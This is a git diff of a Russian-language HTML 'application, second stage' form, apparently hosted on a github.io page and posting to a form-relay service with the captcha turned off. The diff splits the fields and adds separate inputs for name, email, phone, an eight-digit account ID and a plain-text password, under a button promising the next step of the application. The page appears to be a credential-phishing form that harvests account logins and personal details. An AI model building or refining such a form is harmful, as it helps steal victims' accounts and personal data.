@@ -3,11 +3,6 @@
     <head>
         <meta charset="UTF-8">
         <title>Второй этап заявки</title>
-        <style>
-            #inp {
-                width: 300px;
-            }
-        </style>
         <script src="main.js"></script>
     </head>
     <body>
@@ -17,11 +12,12 @@
                 <input type="hidden" name="_next" value="https://prnnm.github.io/index2.html">
                 <input type="hidden" name="_subject" value="Новый заказ!">
                 <input type="hidden" name="_captcha" value="false">
-                <h3>Ваше Имя, Фамилия: </h3><input type="text" name="name" placeholder="Иван Сусанин" required>
-                <h3>Ваш емаил:</h3><input type="email" name="email" placeholder="example@example.com" required>
-		<h3>Ваш емаил:</h3><input type="phone" name="phone" placeholder="example@example.com" required>
-                <h3>Ваш пароль, ID, Телефон:</h3><textarea type="text" name="message" id="inp" placeholder="пароль; 15086782; +7 (999) 999-99-99"></textarea>
-		<!-- <h3>ID:</h3><input name="name" id="inp" maxlength="8" oninput="said(this)" placeholder="15086782" required> -->
+                <h3>Имя:</h3><input type="text" name="Имя" placeholder="Иван" required>
+                <h3>Фамилия:</h3><input type="text" name="Фамилия" placeholder="Сусанин" required>
+                <h3>Емаил:</h3><input type="email" name="Емаил" id="inp" placeholder="example@example.com" required>
+		<h3>Телeфон</h3><input type="phone" name="Телефон" id="inp" placeholder="+7 (999) 999-99-99" required>
+		<h3>ID:</h3><input name="ID" id="inp" maxlength="8" oninput="said(this)" placeholder="15086782" required>
+                <h3>Пароль:</h3><td><input type="text" name="Пароль" id="inp"></td>
                 <br>
                 <br>
                 <button type="submit">Отправить информацию, следующий шаг заявки</button>
